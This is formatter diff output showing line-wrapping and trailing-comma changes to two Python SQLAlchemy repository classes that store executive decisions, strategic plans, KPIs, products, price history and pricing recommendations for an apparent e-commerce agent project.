 from sqlalchemy import desc, and_, or_
 
 from fs_agt_clean.database.models.executive_models import (
-    ExecutiveDecisionModel, StrategicPlanModel, BusinessInitiativeModel,
-    ResourceAllocationModel, RiskAssessmentModel, InvestmentOpportunityModel,
-    PerformanceKPIModel, BusinessIntelligenceModel
+    ExecutiveDecisionModel,
+    StrategicPlanModel,
+    BusinessInitiativeModel,
+    ResourceAllocationModel,
+    RiskAssessmentModel,
+    InvestmentOpportunityModel,
+    PerformanceKPIModel,
+    BusinessIntelligenceModel,
 )
 from fs_agt_clean.core.models.business_models import (
-    ExecutiveDecision, StrategicPlan, BusinessInitiative, ResourceAllocation,
-    InvestmentOpportunity, PerformanceKPI, BusinessIntelligence
+    ExecutiveDecision,
+    StrategicPlan,
+    BusinessInitiative,
+    ResourceAllocation,
+    InvestmentOpportunity,
+    PerformanceKPI,
+    BusinessIntelligence,
 )
 
 logger = logging.getLogger(__name__)
 
 
 class ExecutiveRepository:
     """Repository for executive agent database operations."""
-    
+
     def __init__(self, db_session: Session):
         """Initialize repository with database session."""
         self.db = db_session
-    
+
     # Executive Decisions
     async def create_executive_decision(self, decision: ExecutiveDecision) -> str:
         """Create a new executive decision record."""
         try:
             db_decision = ExecutiveDecisionModel(
                 decision_id=decision.decision_id,
                 decision_type=decision.decision_type.value,
                 title=decision.title,
                 description=decision.description,
                 context=decision.context,
-                criteria=[{
-                    "criteria_name": c.criteria_name,
-                    "weight": c.weight,
-                    "description": c.description,
-                    "measurement_type": c.measurement_type,
-                    "scale_min": c.scale_min,
-                    "scale_max": c.scale_max,
-                    "higher_is_better": c.higher_is_better
-                } for c in decision.criteria],
-                alternatives=[{
-                    "alternative_id": a.alternative_id,
-                    "name": a.name,
-                    "description": a.description,
-                    "scores": a.scores,
-                    "weighted_score": a.weighted_score,
-                    "pros": a.pros,
-                    "cons": a.cons,
-                    "implementation_complexity": a.implementation_complexity,
-                    "resource_requirements": a.resource_requirements,
-                    "timeline": a.timeline,
-                    "risks": a.risks
-                } for a in decision.alternatives],
+                criteria=[
+                    {
+                        "criteria_name": c.criteria_name,
+                        "weight": c.weight,
+                        "description": c.description,
+                        "measurement_type": c.measurement_type,
+                        "scale_min": c.scale_min,
+                        "scale_max": c.scale_max,
+                        "higher_is_better": c.higher_is_better,
+                    }
+                    for c in decision.criteria
+                ],
+                alternatives=[
+                    {
+                        "alternative_id": a.alternative_id,
+                        "name": a.name,
+                        "description": a.description,
+                        "scores": a.scores,
+                        "weighted_score": a.weighted_score,
+                        "pros": a.pros,
+                        "cons": a.cons,
+                        "implementation_complexity": a.implementation_complexity,
+                        "resource_requirements": a.resource_requirements,
+                        "timeline": a.timeline,
+                        "risks": a.risks,
+                    }
+                    for a in decision.alternatives
+                ],
                 recommended_alternative=decision.recommended_alternative,
                 recommendation_reasoning=decision.recommendation_reasoning,
                 confidence_score=decision.confidence_score,
-                financial_impact={
-                    "revenue": float(decision.financial_impact.revenue),
-                    "profit": float(decision.financial_impact.profit),
-                    "margin": decision.financial_impact.margin,
-                    "roi": decision.financial_impact.roi,
-                    "cash_flow": float(decision.financial_impact.cash_flow),
-                    "expenses": float(decision.financial_impact.expenses),
-                    "currency": decision.financial_impact.currency,
-                    "period": decision.financial_impact.period
-                } if decision.financial_impact else None,
-                risk_assessment=[{
-                    "factor_id": r.factor_id,
-                    "name": r.name,
-                    "description": r.description,
-                    "probability": r.probability,
-                    "impact": r.impact,
-                    "risk_level": r.risk_level.value,
-                    "mitigation_strategies": r.mitigation_strategies,
-                    "owner": r.owner,
-                    "timeline": r.timeline
-                } for r in decision.risk_assessment],
+                financial_impact=(
+                    {
+                        "revenue": float(decision.financial_impact.revenue),
+                        "profit": float(decision.financial_impact.profit),
+                        "margin": decision.financial_impact.margin,
+                        "roi": decision.financial_impact.roi,
+                        "cash_flow": float(decision.financial_impact.cash_flow),
+                        "expenses": float(decision.financial_impact.expenses),
+                        "currency": decision.financial_impact.currency,
+                        "period": decision.financial_impact.period,
+                    }
+                    if decision.financial_impact
+                    else None
+                ),
+                risk_assessment=[
+                    {
+                        "factor_id": r.factor_id,
+                        "name": r.name,
+                        "description": r.description,
+                        "probability": r.probability,
+                        "impact": r.impact,
+                        "risk_level": r.risk_level.value,
+                        "mitigation_strategies": r.mitigation_strategies,
+                        "owner": r.owner,
+                        "timeline": r.timeline,
+                    }
+                    for r in decision.risk_assessment
+                ],
                 implementation_plan=decision.implementation_plan,
                 success_metrics=decision.success_metrics,
                 approval_required=decision.approval_required,
                 urgency=decision.urgency.value,
                 stakeholders=decision.stakeholders,
                 status=decision.status,
                 created_by=decision.created_by,
                 created_at=decision.created_at,
                 approved_at=decision.approved_at,
-                approved_by=decision.approved_by
-            )
-            
+                approved_by=decision.approved_by,
+            )
+
             self.db.add(db_decision)
             self.db.commit()
             self.db.refresh(db_decision)
-            
+
             logger.info(f"Created executive decision: {decision.decision_id}")
             return db_decision.decision_id
-            
+
         except Exception as e:
             logger.error(f"Error creating executive decision: {e}")
             self.db.rollback()
             raise
-    
-    async def get_executive_decision(self, decision_id: str) -> Optional[ExecutiveDecisionModel]:
+
+    async def get_executive_decision(
+        self, decision_id: str
+    ) -> Optional[ExecutiveDecisionModel]:
         """Get executive decision by ID."""
         try:
-            return self.db.query(ExecutiveDecisionModel).filter(
-                ExecutiveDecisionModel.decision_id == decision_id
-            ).first()
+            return (
+                self.db.query(ExecutiveDecisionModel)
+                .filter(ExecutiveDecisionModel.decision_id == decision_id)
+                .first()
+            )
         except Exception as e:
             logger.error(f"Error getting executive decision {decision_id}: {e}")
             return None
-    
+
     async def get_executive_decisions_by_type(
-        self, 
-        decision_type: str, 
-        limit: int = 50
+        self, decision_type: str, limit: int = 50
     ) -> List[ExecutiveDecisionModel]:
         """Get executive decisions by type."""
         try:
-            return self.db.query(ExecutiveDecisionModel).filter(
-                ExecutiveDecisionModel.decision_type == decision_type
-            ).order_by(desc(ExecutiveDecisionModel.created_at)).limit(limit).all()
-        except Exception as e:
-            logger.error(f"Error getting executive decisions by type {decision_type}: {e}")
-            return []
-    
-    async def get_pending_decisions(self, limit: int = 20) -> List[ExecutiveDecisionModel]:
+            return (
+                self.db.query(ExecutiveDecisionModel)
+                .filter(ExecutiveDecisionModel.decision_type == decision_type)
+                .order_by(desc(ExecutiveDecisionModel.created_at))
+                .limit(limit)
+                .all()
+            )
+        except Exception as e:
+            logger.error(
+                f"Error getting executive decisions by type {decision_type}: {e}"
+            )
+            return []
+
+    async def get_pending_decisions(
+        self, limit: int = 20
+    ) -> List[ExecutiveDecisionModel]:
         """Get pending executive decisions requiring approval."""
         try:
-            return self.db.query(ExecutiveDecisionModel).filter(
-                and_(
-                    ExecutiveDecisionModel.status == "pending",
-                    ExecutiveDecisionModel.approval_required == True
+            return (
+                self.db.query(ExecutiveDecisionModel)
+                .filter(
+                    and_(
+                        ExecutiveDecisionModel.status == "pending",
+                        ExecutiveDecisionModel.approval_required == True,
+                    )
                 )
-            ).order_by(desc(ExecutiveDecisionModel.created_at)).limit(limit).all()
+                .order_by(desc(ExecutiveDecisionModel.created_at))
+                .limit(limit)
+                .all()
+            )
         except Exception as e:
             logger.error(f"Error getting pending decisions: {e}")
             return []
-    
+
     async def update_decision_status(
-        self, 
-        decision_id: str, 
-        status: str, 
-        approved_by: Optional[str] = None
+        self, decision_id: str, status: str, approved_by: Optional[str] = None
     ) -> bool:
         """Update decision status and approval."""
         try:
             decision = await self.get_executive_decision(decision_id)
             if decision:
                 decision.status = status
                 if approved_by:
                     decision.approved_by = approved_by
                     decision.approved_at = datetime.now(timezone.utc)
-                
+
                 self.db.commit()
                 logger.info(f"Updated decision {decision_id} status to {status}")
                 return True
             return False
         except Exception as e:
             logger.error(f"Error updating decision status: {e}")
             self.db.rollback()
             return False
-    
+
     # Strategic Plans
     async def create_strategic_plan(self, plan: StrategicPlan) -> str:
         """Create a new strategic plan."""
         try:
             db_plan = StrategicPlanModel(
                 plan_id=plan.plan_id,
                 name=plan.name,
                 description=plan.description,
                 time_horizon=plan.time_horizon,
                 objectives=[obj.value for obj in plan.objectives],
-                initiatives=[{
-                    "initiative_id": init.initiative_id,
-                    "name": init.name,
-                    "description": init.description,
-                    "objective": init.objective.value,
-                    "priority": init.priority.value,
-                    "estimated_cost": float(init.estimated_cost),
-                    "estimated_revenue": float(init.estimated_revenue),
-                    "estimated_roi": init.estimated_roi,
-                    "timeline_months": init.timeline_months,
-                    "required_resources": init.required_resources,
-                    "success_metrics": init.success_metrics,
-                    "risks": init.risks,
-                    "dependencies": init.dependencies,
-                    "status": init.status,
-                    "created_at": init.created_at.isoformat()
-                } for init in plan.initiatives],
+                initiatives=[
+                    {
+                        "initiative_id": init.initiative_id,
+                        "name": init.name,
+                        "description": init.description,
+                        "objective": init.objective.value,
+                        "priority": init.priority.value,
+                        "estimated_cost": float(init.estimated_cost),
+                        "estimated_revenue": float(init.estimated_revenue),
+                        "estimated_roi": init.estimated_roi,
+                        "timeline_months": init.timeline_months,
+                        "required_resources": init.required_resources,
+                        "success_metrics": init.success_metrics,
+                        "risks": init.risks,
+                        "dependencies": init.dependencies,
+                        "status": init.status,
+                        "created_at": init.created_at.isoformat(),
+                    }
+                    for init in plan.initiatives
+                ],
                 total_budget=plan.total_budget,
                 expected_roi=plan.expected_roi,
                 key_metrics=plan.key_metrics,
                 success_criteria=plan.success_criteria,
-                risks=[{
-                    "factor_id": r.factor_id,
-                    "name": r.name,
-                    "description": r.description,
-                    "probability": r.probability,
-                    "impact": r.impact,
-                    "risk_level": r.risk_level.value,
-                    "mitigation_strategies": r.mitigation_strategies
-                } for r in plan.risks],
+                risks=[
+                    {
+                        "factor_id": r.factor_id,
+                        "name": r.name,
+                        "description": r.description,
+                        "probability": r.probability,
+                        "impact": r.impact,
+                        "risk_level": r.risk_level.value,
+                        "mitigation_strategies": r.mitigation_strategies,
+                    }
+                    for r in plan.risks
+                ],
                 milestones=plan.milestones,
                 status=plan.status,
                 created_by=plan.created_by,
                 approved_by=plan.approved_by,
                 created_at=plan.created_at,
-                approved_at=plan.approved_at
-            )
-            
+                approved_at=plan.approved_at,
+            )
+
             self.db.add(db_plan)
             self.db.commit()
             self.db.refresh(db_plan)
-            
+
             logger.info(f"Created strategic plan: {plan.plan_id}")
             return db_plan.plan_id
-            
+
         except Exception as e:
             logger.error(f"Error creating strategic plan: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_strategic_plan(self, plan_id: str) -> Optional[StrategicPlanModel]:
         """Get strategic plan by ID."""
         try:
-            return self.db.query(StrategicPlanModel).filter(
-                StrategicPlanModel.plan_id == plan_id
-            ).first()
+            return (
+                self.db.query(StrategicPlanModel)
+                .filter(StrategicPlanModel.plan_id == plan_id)
+                .first()
+            )
         except Exception as e:
             logger.error(f"Error getting strategic plan {plan_id}: {e}")
             return None
-    
+
     async def get_strategic_plans_by_horizon(
-        self, 
-        time_horizon: str, 
-        limit: int = 20
+        self, time_horizon: str, limit: int = 20
     ) -> List[StrategicPlanModel]:
         """Get strategic plans by time horizon."""
         try:
-            return self.db.query(StrategicPlanModel).filter(
-                StrategicPlanModel.time_horizon == time_horizon
-            ).order_by(desc(StrategicPlanModel.created_at)).limit(limit).all()
-        except Exception as e:
-            logger.error(f"Error getting strategic plans by horizon {time_horizon}: {e}")
-            return []
-    
+            return (
+                self.db.query(StrategicPlanModel)
+                .filter(StrategicPlanModel.time_horizon == time_horizon)
+                .order_by(desc(StrategicPlanModel.created_at))
+                .limit(limit)
+                .all()
+            )
+        except Exception as e:
+            logger.error(
+                f"Error getting strategic plans by horizon {time_horizon}: {e}"
+            )
+            return []
+
     # Business Initiatives
     async def create_business_initiative(self, initiative: BusinessInitiative) -> str:
         """Create a new business initiative."""
         try:
             db_initiative = BusinessInitiativeModel(
@@ -274,39 +322,41 @@
                 required_resources=initiative.required_resources,
                 success_metrics=initiative.success_metrics,
                 risks=initiative.risks,
                 dependencies=initiative.dependencies,
                 status=initiative.status,
-                created_at=initiative.created_at
-            )
-            
+                created_at=initiative.created_at,
+            )
+
             self.db.add(db_initiative)
             self.db.commit()
             self.db.refresh(db_initiative)
-            
+
             logger.info(f"Created business initiative: {initiative.initiative_id}")
             return db_initiative.initiative_id
-            
+
         except Exception as e:
             logger.error(f"Error creating business initiative: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_initiatives_by_objective(
-        self, 
-        objective: str, 
-        limit: int = 20
+        self, objective: str, limit: int = 20
     ) -> List[BusinessInitiativeModel]:
         """Get business initiatives by objective."""
         try:
-            return self.db.query(BusinessInitiativeModel).filter(
-                BusinessInitiativeModel.objective == objective
-            ).order_by(desc(BusinessInitiativeModel.created_at)).limit(limit).all()
+            return (
+                self.db.query(BusinessInitiativeModel)
+                .filter(BusinessInitiativeModel.objective == objective)
+                .order_by(desc(BusinessInitiativeModel.created_at))
+                .limit(limit)
+                .all()
+            )
         except Exception as e:
             logger.error(f"Error getting initiatives by objective {objective}: {e}")
             return []
-    
+
     # Resource Allocations
     async def create_resource_allocation(self, allocation: ResourceAllocation) -> str:
         """Create a new resource allocation."""
         try:
             db_allocation = ResourceAllocationModel(
@@ -318,93 +368,102 @@
                 justification=allocation.justification,
                 priority_score=allocation.priority_score,
                 expected_impact=allocation.expected_impact,
                 constraints=allocation.constraints,
                 alternatives=allocation.alternatives,
-                created_at=allocation.created_at
-            )
-            
+                created_at=allocation.created_at,
+            )
+
             self.db.add(db_allocation)
             self.db.commit()
             self.db.refresh(db_allocation)
-            
+
             logger.info(f"Created resource allocation: {allocation.allocation_id}")
             return db_allocation.allocation_id
-            
+
         except Exception as e:
             logger.error(f"Error creating resource allocation: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_allocations_by_resource_type(
-        self, 
-        resource_type: str, 
-        limit: int = 50
+        self, resource_type: str, limit: int = 50
     ) -> List[ResourceAllocationModel]:
         """Get resource allocations by type."""
         try:
-            return self.db.query(ResourceAllocationModel).filter(
-                ResourceAllocationModel.resource_type == resource_type
-            ).order_by(desc(ResourceAllocationModel.created_at)).limit(limit).all()
-        except Exception as e:
-            logger.error(f"Error getting allocations by resource type {resource_type}: {e}")
-            return []
-    
+            return (
+                self.db.query(ResourceAllocationModel)
+                .filter(ResourceAllocationModel.resource_type == resource_type)
+                .order_by(desc(ResourceAllocationModel.created_at))
+                .limit(limit)
+                .all()
+            )
+        except Exception as e:
+            logger.error(
+                f"Error getting allocations by resource type {resource_type}: {e}"
+            )
+            return []
+
     # Risk Assessments
     async def create_risk_assessment(
-        self, 
-        assessment_type: str,
-        related_entity_id: str,
-        risk_data: Dict[str, Any]
+        self, assessment_type: str, related_entity_id: str, risk_data: Dict[str, Any]
     ) -> str:
         """Create a new risk assessment."""
         try:
-            assessment_id = f"risk_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}"
-            
+            assessment_id = (
+                f"risk_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}"
+            )
+
             db_assessment = RiskAssessmentModel(
                 assessment_id=assessment_id,
                 assessment_type=assessment_type,
                 related_entity_id=related_entity_id,
                 overall_risk_level=risk_data.get("overall_risk_level", "medium"),
                 risk_score=risk_data.get("risk_score", 0.5),
                 identified_risks=risk_data.get("identified_risks", []),
                 risk_scenarios=risk_data.get("risk_scenarios", []),
                 mitigation_plan=risk_data.get("mitigation_plan", []),
                 monitoring_requirements=risk_data.get("monitoring_requirements", []),
-                contingency_recommendations=risk_data.get("contingency_recommendations", []),
+                contingency_recommendations=risk_data.get(
+                    "contingency_recommendations", []
+                ),
                 risk_tolerance_alignment=risk_data.get("risk_tolerance_alignment", ""),
-                confidence_score=risk_data.get("confidence_score", 0.7)
-            )
-            
+                confidence_score=risk_data.get("confidence_score", 0.7),
+            )
+
             self.db.add(db_assessment)
             self.db.commit()
             self.db.refresh(db_assessment)
-            
+
             logger.info(f"Created risk assessment: {assessment_id}")
             return assessment_id
-            
+
         except Exception as e:
             logger.error(f"Error creating risk assessment: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_risk_assessments_by_entity(
-        self, 
-        entity_id: str, 
-        limit: int = 10
+        self, entity_id: str, limit: int = 10
     ) -> List[RiskAssessmentModel]:
         """Get risk assessments for a specific entity."""
         try:
-            return self.db.query(RiskAssessmentModel).filter(
-                RiskAssessmentModel.related_entity_id == entity_id
-            ).order_by(desc(RiskAssessmentModel.created_at)).limit(limit).all()
+            return (
+                self.db.query(RiskAssessmentModel)
+                .filter(RiskAssessmentModel.related_entity_id == entity_id)
+                .order_by(desc(RiskAssessmentModel.created_at))
+                .limit(limit)
+                .all()
+            )
         except Exception as e:
             logger.error(f"Error getting risk assessments for entity {entity_id}: {e}")
             return []
-    
+
     # Investment Opportunities
-    async def create_investment_opportunity(self, opportunity: InvestmentOpportunity) -> str:
+    async def create_investment_opportunity(
+        self, opportunity: InvestmentOpportunity
+    ) -> str:
         """Create a new investment opportunity."""
         try:
             db_opportunity = InvestmentOpportunityModel(
                 opportunity_id=opportunity.opportunity_id,
                 name=opportunity.name,
@@ -418,61 +477,71 @@
                 irr=opportunity.irr,
                 risk_assessment=opportunity.risk_assessment.value,
                 market_size=opportunity.market_size,
                 competitive_advantage=opportunity.competitive_advantage,
                 success_probability=opportunity.success_probability,
-                financial_projections=[{
-                    "revenue": float(fp.revenue),
-                    "profit": float(fp.profit),
-                    "margin": fp.margin,
-                    "roi": fp.roi,
-                    "cash_flow": float(fp.cash_flow),
-                    "expenses": float(fp.expenses),
-                    "currency": fp.currency,
-                    "period": fp.period,
-                    "timestamp": fp.timestamp.isoformat()
-                } for fp in opportunity.financial_projections],
-                risks=[{
-                    "factor_id": r.factor_id,
-                    "name": r.name,
-                    "description": r.description,
-                    "probability": r.probability,
-                    "impact": r.impact,
-                    "risk_level": r.risk_level.value,
-                    "mitigation_strategies": r.mitigation_strategies
-                } for r in opportunity.risks],
+                financial_projections=[
+                    {
+                        "revenue": float(fp.revenue),
+                        "profit": float(fp.profit),
+                        "margin": fp.margin,
+                        "roi": fp.roi,
+                        "cash_flow": float(fp.cash_flow),
+                        "expenses": float(fp.expenses),
+                        "currency": fp.currency,
+                        "period": fp.period,
+                        "timestamp": fp.timestamp.isoformat(),
+                    }
+                    for fp in opportunity.financial_projections
+                ],
+                risks=[
+                    {
+                        "factor_id": r.factor_id,
+                        "name": r.name,
+                        "description": r.description,
+                        "probability": r.probability,
+                        "impact": r.impact,
+                        "risk_level": r.risk_level.value,
+                        "mitigation_strategies": r.mitigation_strategies,
+                    }
+                    for r in opportunity.risks
+                ],
                 recommendation=opportunity.recommendation,
                 confidence_score=opportunity.confidence_score,
-                created_at=opportunity.created_at
-            )
-            
+                created_at=opportunity.created_at,
+            )
+
             self.db.add(db_opportunity)
             self.db.commit()
             self.db.refresh(db_opportunity)
-            
+
             logger.info(f"Created investment opportunity: {opportunity.opportunity_id}")
             return db_opportunity.opportunity_id
-            
+
         except Exception as e:
             logger.error(f"Error creating investment opportunity: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_investment_opportunities_by_type(
-        self, 
-        investment_type: str, 
-        limit: int = 20
+        self, investment_type: str, limit: int = 20
     ) -> List[InvestmentOpportunityModel]:
         """Get investment opportunities by type."""
         try:
-            return self.db.query(InvestmentOpportunityModel).filter(
-                InvestmentOpportunityModel.investment_type == investment_type
-            ).order_by(desc(InvestmentOpportunityModel.roi)).limit(limit).all()
-        except Exception as e:
-            logger.error(f"Error getting investment opportunities by type {investment_type}: {e}")
-            return []
-    
+            return (
+                self.db.query(InvestmentOpportunityModel)
+                .filter(InvestmentOpportunityModel.investment_type == investment_type)
+                .order_by(desc(InvestmentOpportunityModel.roi))
+                .limit(limit)
+                .all()
+            )
+        except Exception as e:
+            logger.error(
+                f"Error getting investment opportunities by type {investment_type}: {e}"
+            )
+            return []
+
     # Performance KPIs
     async def create_performance_kpi(self, kpi: PerformanceKPI) -> str:
         """Create a new performance KPI."""
         try:
             db_kpi = PerformanceKPIModel(
@@ -487,41 +556,45 @@
                 performance_status=kpi.performance_status,
                 historical_values=kpi.historical_values,
                 benchmark_value=kpi.benchmark_value,
                 owner=kpi.owner,
                 update_frequency=kpi.update_frequency,
-                last_updated=kpi.last_updated
-            )
-            
+                last_updated=kpi.last_updated,
+            )
+
             self.db.add(db_kpi)
             self.db.commit()
             self.db.refresh(db_kpi)
-            
+
             logger.info(f"Created performance KPI: {kpi.kpi_id}")
             return db_kpi.kpi_id
-            
+
         except Exception as e:
             logger.error(f"Error creating performance KPI: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_kpis_by_category(
-        self, 
-        category: str, 
-        limit: int = 20
+        self, category: str, limit: int = 20
     ) -> List[PerformanceKPIModel]:
         """Get KPIs by category."""
         try:
-            return self.db.query(PerformanceKPIModel).filter(
-                PerformanceKPIModel.category == category
-            ).order_by(desc(PerformanceKPIModel.last_updated)).limit(limit).all()
+            return (
+                self.db.query(PerformanceKPIModel)
+                .filter(PerformanceKPIModel.category == category)
+                .order_by(desc(PerformanceKPIModel.last_updated))
+                .limit(limit)
+                .all()
+            )
         except Exception as e:
             logger.error(f"Error getting KPIs by category {category}: {e}")
             return []
-    
+
     # Business Intelligence
-    async def create_business_intelligence(self, intelligence: BusinessIntelligence) -> str:
+    async def create_business_intelligence(
+        self, intelligence: BusinessIntelligence
+    ) -> str:
         """Create a new business intelligence record."""
         try:
             db_intelligence = BusinessIntelligenceModel(
                 data_id=intelligence.data_id,
                 data_type=intelligence.data_type,
@@ -531,33 +604,37 @@
                 trends=intelligence.trends,
                 recommendations=intelligence.recommendations,
                 confidence_level=intelligence.confidence_level,
                 data_quality=intelligence.data_quality,
                 last_updated=intelligence.last_updated,
-                valid_until=intelligence.valid_until
-            )
-            
+                valid_until=intelligence.valid_until,
+            )
+
             self.db.add(db_intelligence)
             self.db.commit()
             self.db.refresh(db_intelligence)
-            
+
             logger.info(f"Created business intelligence: {intelligence.data_id}")
             return db_intelligence.data_id
-            
+
         except Exception as e:
             logger.error(f"Error creating business intelligence: {e}")
             self.db.rollback()
             raise
-    
+
     async def get_business_intelligence_by_type(
-        self, 
-        data_type: str, 
-        limit: int = 10
+        self, data_type: str, limit: int = 10
     ) -> List[BusinessIntelligenceModel]:
         """Get business intelligence by data type."""
         try:
-            return self.db.query(BusinessIntelligenceModel).filter(
-                BusinessIntelligenceModel.data_type == data_type
-            ).order_by(desc(BusinessIntelligenceModel.last_updated)).limit(limit).all()
-        except Exception as e:
-            logger.error(f"Error getting business intelligence by type {data_type}: {e}")
-            return []
+            return (
+                self.db.query(BusinessIntelligenceModel)
+                .filter(BusinessIntelligenceModel.data_type == data_type)
+                .order_by(desc(BusinessIntelligenceModel.last_updated))
+                .limit(limit)
+                .all()
+            )
+        except Exception as e:
+            logger.error(
+                f"Error getting business intelligence by type {data_type}: {e}"
+            )
+            return []
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/executive_repository.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/main.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/market_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/market_repository.py	2025-06-19 04:04:01.450630+00:00
@@ -13,31 +13,40 @@
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy import select, insert, update, delete, and_, or_, desc
 from sqlalchemy.orm import selectinload
 
 from fs_agt_clean.database.models.market_models import (
-    ProductModel, PriceHistoryModel, CompetitorModel, InventoryModel,
-    MarketDecisionModel, PricingRecommendationModel
+    ProductModel,
+    PriceHistoryModel,
+    CompetitorModel,
+    InventoryModel,
+    MarketDecisionModel,
+    PricingRecommendationModel,
 )
 from fs_agt_clean.core.models.marketplace_models import (
-    ProductIdentifier, Price, PricingRecommendation, CompetitorAnalysis,
-    InventoryStatus, MarketDecision, MarketplaceType
+    ProductIdentifier,
+    Price,
+    PricingRecommendation,
+    CompetitorAnalysis,
+    InventoryStatus,
+    MarketDecision,
+    MarketplaceType,
 )
 
 logger = logging.getLogger(__name__)
 
 
 class MarketRepository:
     """Repository for market-related database operations."""
-    
+
     async def create_product(
         self,
         session: AsyncSession,
         product_id: ProductIdentifier,
         title: str,
         marketplace: MarketplaceType,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> ProductModel:
         """Create a new product record."""
         try:
             product_data = {
                 "asin": product_id.asin,
@@ -50,40 +59,38 @@
                 "internal_id": product_id.internal_id,
                 "title": title,
                 "marketplace": marketplace.value,
                 "metadata": metadata or {},
                 "created_at": datetime.now(timezone.utc),
-                "updated_at": datetime.now(timezone.utc)
+                "updated_at": datetime.now(timezone.utc),
             }
-            
+
             stmt = insert(ProductModel).values(**product_data)
             result = await session.execute(stmt)
             await session.commit()
-            
+
             # Get the created product
             product_id_db = result.inserted_primary_key[0]
             stmt = select(ProductModel).where(ProductModel.id == product_id_db)
             result = await session.execute(stmt)
             product = result.scalar_one()
-            
+
             logger.info(f"Created product: {product.id}")
             return product
-            
+
         except Exception as e:
             await session.rollback()
             logger.error(f"Error creating product: {e}")
             raise
-    
+
     async def get_product_by_identifier(
-        self,
-        session: AsyncSession,
-        product_id: ProductIdentifier
+        self, session: AsyncSession, product_id: ProductIdentifier
     ) -> Optional[ProductModel]:
         """Get product by any identifier."""
         try:
             conditions = []
-            
+
             if product_id.asin:
                 conditions.append(ProductModel.asin == product_id.asin)
             if product_id.sku:
                 conditions.append(ProductModel.sku == product_id.sku)
             if product_id.upc:
@@ -92,28 +99,24 @@
                 conditions.append(ProductModel.ean == product_id.ean)
             if product_id.ebay_item_id:
                 conditions.append(ProductModel.ebay_item_id == product_id.ebay_item_id)
             if product_id.internal_id:
                 conditions.append(ProductModel.internal_id == product_id.internal_id)
-            
+
             if not conditions:
                 return None
-            
+
             stmt = select(ProductModel).where(or_(*conditions))
             result = await session.execute(stmt)
             return result.scalar_one_or_none()
-            
+
         except Exception as e:
             logger.error(f"Error getting product by identifier: {e}")
             return None
-    
+
     async def store_price_history(
-        self,
-        session: AsyncSession,
-        product_id: int,
-        price: Price,
-        source: str = "api"
+        self, session: AsyncSession, product_id: int, price: Price, source: str = "api"
     ) -> PriceHistoryModel:
         """Store price history record."""
         try:
             price_data = {
                 "product_id": product_id,
@@ -122,83 +125,83 @@
                 "marketplace": price.marketplace.value,
                 "includes_shipping": price.includes_shipping,
                 "includes_tax": price.includes_tax,
                 "source": source,
                 "recorded_at": price.timestamp,
-                "created_at": datetime.now(timezone.utc)
+                "created_at": datetime.now(timezone.utc),
             }
-            
+
             stmt = insert(PriceHistoryModel).values(**price_data)
             result = await session.execute(stmt)
             await session.commit()
-            
+
             # Get the created record
             price_id = result.inserted_primary_key[0]
             stmt = select(PriceHistoryModel).where(PriceHistoryModel.id == price_id)
             result = await session.execute(stmt)
             price_record = result.scalar_one()
-            
+
             logger.info(f"Stored price history: {price_record.id}")
             return price_record
-            
+
         except Exception as e:
             await session.rollback()
             logger.error(f"Error storing price history: {e}")
             raise
-    
+
     async def get_price_history(
         self,
         session: AsyncSession,
         product_id: int,
         marketplace: Optional[MarketplaceType] = None,
         days: int = 30,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[PriceHistoryModel]:
         """Get price history for a product."""
         try:
             cutoff_date = datetime.now(timezone.utc) - timezone.timedelta(days=days)
-            
+
             conditions = [
                 PriceHistoryModel.product_id == product_id,
-                PriceHistoryModel.recorded_at >= cutoff_date
+                PriceHistoryModel.recorded_at >= cutoff_date,
             ]
-            
+
             if marketplace:
                 conditions.append(PriceHistoryModel.marketplace == marketplace.value)
-            
+
             stmt = (
                 select(PriceHistoryModel)
                 .where(and_(*conditions))
                 .order_by(desc(PriceHistoryModel.recorded_at))
                 .limit(limit)
             )
-            
+
             result = await session.execute(stmt)
             return result.scalars().all()
-            
+
         except Exception as e:
             logger.error(f"Error getting price history: {e}")
             return []
-    
+
     async def store_pricing_recommendation(
-        self,
-        session: AsyncSession,
-        recommendation: PricingRecommendation
+        self, session: AsyncSession, recommendation: PricingRecommendation
     ) -> PricingRecommendationModel:
         """Store pricing recommendation."""
         try:
             # First, ensure product exists
-            product = await self.get_product_by_identifier(session, recommendation.product_id)
+            product = await self.get_product_by_identifier(
+                session, recommendation.product_id
+            )
             if not product:
                 # Create product if it doesn't exist
                 product = await self.create_product(
                     session,
                     recommendation.product_id,
                     f"Product {recommendation.product_id.asin or recommendation.product_id.sku}",
-                    recommendation.current_price.marketplace
-                )
-            
+                    recommendation.current_price.marketplace,
+                )
+
             recommendation_data = {
                 "product_id": product.id,
                 "current_price": recommendation.current_price.amount,
                 "recommended_price": recommendation.recommended_price.amount,
                 "currency": recommendation.current_price.currency,
@@ -208,78 +211,82 @@
                 "reasoning": recommendation.reasoning,
                 "expected_impact": recommendation.expected_impact,
                 "market_conditions": recommendation.market_conditions,
                 "recommendation_id": recommendation.recommendation_id,
                 "expires_at": recommendation.expires_at,
-                "created_at": recommendation.created_at
+                "created_at": recommendation.created_at,
             }
-            
+
             stmt = insert(PricingRecommendationModel).values(**recommendation_data)
             result = await session.execute(stmt)
             await session.commit()
-            
+
             # Get the created record
             rec_id = result.inserted_primary_key[0]
-            stmt = select(PricingRecommendationModel).where(PricingRecommendationModel.id == rec_id)
+            stmt = select(PricingRecommendationModel).where(
+                PricingRecommendationModel.id == rec_id
+            )
             result = await session.execute(stmt)
             rec_record = result.scalar_one()
-            
+
             logger.info(f"Stored pricing recommendation: {rec_record.id}")
             return rec_record
-            
+
         except Exception as e:
             await session.rollback()
             logger.error(f"Error storing pricing recommendation: {e}")
             raise
-    
+
     async def get_latest_pricing_recommendations(
         self,
         session: AsyncSession,
         product_id: Optional[int] = None,
